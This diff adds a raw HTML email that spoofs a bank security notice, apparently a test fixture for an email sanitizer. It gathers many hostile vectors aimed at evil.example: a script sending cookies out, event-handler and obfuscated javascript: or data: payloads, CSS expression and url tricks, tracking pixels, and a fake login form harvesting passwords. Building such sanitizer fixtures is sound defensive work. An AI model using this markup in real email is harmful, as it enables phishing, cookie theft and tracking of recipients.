@@ -1,0 +1,47 @@
+From: "Security Team" <security@mybank.example>
+To: Robin Vale <robin@example.org>
+Subject: Action required
+Date: Sat, 14 Nov 2026 10:34:00 +0000
+Message-ID: <hostile.1@evil.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=https://evil.example/landing">
+<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'">
+<link rel="stylesheet" href="https://evil.example/track.css">
+<script src="https://evil.example/steal.js"></script>
+<script>document.location = 'https://evil.example/?c=' + document.cookie</script>
+<style>
+@import url(https://evil.example/import.css);
+@import "//evil.example/import2.css";
+body { background: url(https://evil.example/bg.png) }
+.a { background: URL( 'https://evil.example/a.png' ) }
+.b { background: u\72l(https://evil.example/b.png) }
+.c { width: expression(steal()) }
+@font-face { font-family: x; src: url(https://evil.example/font.woff2) }
+</style>
+<style>.d { color: red; background-image: url(//evil.example/d.png) }</style>
+</head>
+<body onload="steal()" background="https://evil.example/body.png">
+<p onclick="steal()" style="background:url(https://evil.example/p.png)">Your account needs attention.</p>
+<img src="x" onerror="steal()">
+<img src="https://evil.example/pixel.gif?id=robin" width="1" height="1" alt="">
+<img srcset="https://evil.example/1x.png 1x, https://evil.example/2x.png 2x" alt="Logo">
+<a href="javascript:steal()">Click</a> <a href="jaVa&#9;sCript:steal()">here</a>
+<a href="data:text/html;base64,PHNjcmlwdD5zdGVhbCgpPC9zY3JpcHQ+">or here</a>
+<a href="file:///Applications/Calculator.app">or open this</a>
+<a href="https://evil.example/login" onmouseover="steal()">https://www.mybank.example/login</a>
+<form action="https://evil.example/collect" method="post">
+<input type="text" name="user"><input type="password" name="password"><button>Sign in</button>
+</form>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
+<svg onload="steal()"><script>steal()</script><image href="https://evil.example/svg.png"/></svg>
+<math><mi xlink:href="javascript:steal()">x</mi></math>
+<video src="https://evil.example/v.mp4" poster="https://evil.example/poster.jpg" autoplay></video>
+<noscript><img src="https://evil.example/noscript.gif"></noscript>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://evil.example/overlay.png')">Overlay</div>
+<p>Unclosed <b>tags <i>everywhere <a href="https://evil.example/unclosed">
+</body></html>
